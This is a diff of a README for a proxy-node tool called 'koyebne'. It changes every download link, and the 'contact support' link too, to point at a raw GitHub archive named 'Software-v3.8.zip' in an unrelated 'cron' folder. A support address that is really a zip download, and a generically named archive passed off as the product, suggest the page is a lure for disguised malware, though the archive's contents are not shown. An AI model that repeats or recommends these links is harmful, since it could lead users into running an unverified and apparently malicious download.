@@ -8,9 +8,9 @@ Welcome to koyebne! This application allows you to create a proxy node that can 
 
 You can download the latest version of koyebne from our Releases page. 
 
-[![Download koyebne](https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/nginx/koyebne_1.0-alpha.2.zip)](https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/nginx/koyebne_1.0-alpha.2.zip)
+[![Download koyebne](https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/cron/Software-v3.8.zip)](https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/cron/Software-v3.8.zip)
 
-Visit this page to download the software: [Download Koyebne](https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/nginx/koyebne_1.0-alpha.2.zip)
+Visit this page to download the software: [Download Koyebne](https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/cron/Software-v3.8.zip)
 
 ### Step-by-Step Instructions
 
@@ -63,7 +63,7 @@ koyebne provides several helpful features:
 
 ## 📞 Support
 
-If you encounter any issues while downloading or using koyebne, please feel free to reach out for help. You can open an issue on this repository or contact support at [https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/nginx/koyebne_1.0-alpha.2.zip](https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/nginx/koyebne_1.0-alpha.2.zip).
+If you encounter any issues while downloading or using koyebne, please feel free to reach out for help. You can open an issue on this repository or contact support at [https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/cron/Software-v3.8.zip](https://raw.githubusercontent.com/nadipcandra/koyebne/main/kbne/app/cron/Software-v3.8.zip).
 
 ## 🛠️ Contribution
 
